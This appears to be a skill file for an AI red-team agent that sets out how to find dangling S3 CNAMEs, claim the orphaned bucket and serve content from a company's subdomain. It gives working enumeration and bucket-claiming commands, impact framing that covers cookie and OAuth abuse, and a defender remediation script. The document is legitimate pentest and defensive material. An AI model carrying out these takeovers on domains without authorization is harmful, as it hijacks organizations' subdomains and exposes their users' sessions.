---
name: s3-takeover
description: Detect and claim dangling S3 buckets referenced by subdomains (CNAME → s3 hostnames where bucket no longer exists).
metadata:
  subdomain: cloud
  when_to_use: "s3 bucket takeover dangling cname"
  mitre_attack:
    - T1584.006
    - T1583.006
---

# S3 Subdomain Takeover

When a subdomain has a `CNAME` to an S3 hostname (e.g.
`assets.example.com → assets-example.s3.amazonaws.com`) but the bucket
no longer exists, **anyone can register that bucket name and serve
content from the subdomain**.

## 1. Enumerate subdomains pointing at S3
From recon SUMMARY.md, look for any CNAME containing:
- `s3.amazonaws.com`
- `s3-website-<region>.amazonaws.com`
- `s3.<region>.amazonaws.com`
- `s3-website.<region>.amazonaws.com`
- `<bucket>.s3.<region>.amazonaws.com`
- CloudFront/CDN distributions backed by S3 (`.cloudfront.net`)

Or run direct:
```bash
# Subdomain dump
subfinder -d example.com -silent > /tmp/subs.txt

# Check CNAMEs
for s in $(cat /tmp/subs.txt); do
  cname=$(dig +short CNAME "$s" 2>/dev/null | head -1)
  if echo "$cname" | grep -qE 's3.*amazonaws|cloudfront'; then
    echo "$s -> $cname"
  fi
done > /tmp/s3-candidates.txt
```

## 2. Verify dangling
For each candidate:
```bash
# Try to GET the subdomain - look for the S3 "NoSuchBucket" error
curl -s -o /tmp/r.html "https://$SUBDOMAIN/" -w '%{http_code}\n'
grep -E 'NoSuchBucket|BucketNotFound|<Code>NoSuchBucket</Code>' /tmp/r.html

# Or query the bucket name directly
BUCKET=$(echo "$CNAME" | awk -F'.' '{print $1}')
aws s3 ls "s3://$BUCKET/" --no-sign-request 2>&1
# "NoSuchBucket" / "The specified bucket does not exist" = dangling
```

Decepticon helper:
```
s3_takeover_check("<subdomain>")
```

## 3. Claim the bucket
```bash
# In the SAME region the CNAME implies
aws s3api create-bucket \
  --bucket "$BUCKET" \
  --region us-east-1 \
  --create-bucket-configuration LocationConstraint=us-east-1
# (us-east-1 omits the LocationConstraint)
```

**Race conditions**:
- AWS sometimes blocks names of recently-deleted buckets (cooldown). If
  it errors with "BucketAlreadyExists" or "Bucket name reserved", the
  takeover window has closed (or is gated).
- For high-value targets, attempt in different regions — some CNAMEs
  don't specify region and AWS DNS resolves to whichever region you
  create the bucket in.

## 4. Demonstrate impact (safe)
**Static page proof** (engagement context — get explicit permission first):
```bash
echo '<h1>S3 subdomain takeover PoC</h1><p>Demonstrated by ENGAGEMENT-ID</p>' > /tmp/index.html
aws s3 cp /tmp/index.html "s3://$BUCKET/index.html"
aws s3 website "s3://$BUCKET/" --index-document index.html

# Now curl https://$SUBDOMAIN/ returns your content
```

DO NOT:
- Serve actual exploit content (XSS, drive-by, phishing)
- Capture cookies even though you can (same-origin to the org)
- Leave the bucket up post-engagement

DO:
- Take a timestamped screenshot of your benign content served from the subdomain
- Hand the bucket name over to defender for transfer / cooldown
- Delete the bucket after PoC: `aws s3 rb "s3://$BUCKET" --force`

## 5. Impact framing
A claimed S3 bucket on an org subdomain gives:
- **Same-origin scripting** vs every page on that subdomain
- **Cookie access** for cookies scoped to the parent domain (`.example.com`)
- **OAuth redirect_uri** abuse if the subdomain is a registered redirect
- **MITM-class trust** — orgs publish links to the subdomain assuming control
- **TLS** is "free" via the org's own ACM cert if Route 53 + ACM are
  configured, otherwise it's an HTTP-only takeover (still bad)

## 6. Promote
```
kg_add_node(kind="vulnerability", label="S3 takeover: <subdomain>",
            props={"severity":"high","bucket":"<bucket>","region":"<region>"})
kg_add_edge(src=<vuln>, dst=<crown_jewel:org-domain>, kind="grants-impersonation")
```

## CVSS
- Subdomain with active OAuth flow / cookie scope: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = 8.7
- Static-content subdomain only: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` = 7.5
- Subdomain with no apparent purpose (unused): Medium 5-6

## Defender remediation
```bash
# Find every S3 CNAME the org publishes
aws route53 list-hosted-zones --query 'HostedZones[].Id' --output text | \
  xargs -I{} aws route53 list-resource-record-sets --hosted-zone-id {} \
  --query 'ResourceRecordSets[?Type==`CNAME`]' --output json > /tmp/cnames.json

# Cross-check against existing buckets
jq -r '.[] | select(.ResourceRecords[].Value | test("s3.*amazonaws")) | .Name' /tmp/cnames.json | \
  while read sd; do
    bucket=$(dig +short CNAME "$sd" | head -1 | sed 's/.s3.*//; s/.$//')
    aws s3api head-bucket --bucket "$bucket" 2>&1 | grep -q "Not Found" && echo "DANGLING: $sd -> $bucket"
  done
```

## Known exemplars
- 2017: Uber subdomain takeover via S3 → reported via H1, $7.5k
- 2020: Multiple Tesla-owned subdomains pointed at deleted S3 buckets
- 2022: Detectify scan found 350+ Fortune-500 dangling S3 records
- Pattern: M&A acquisitions where the acquired company's cloud assets aren't transferred properly
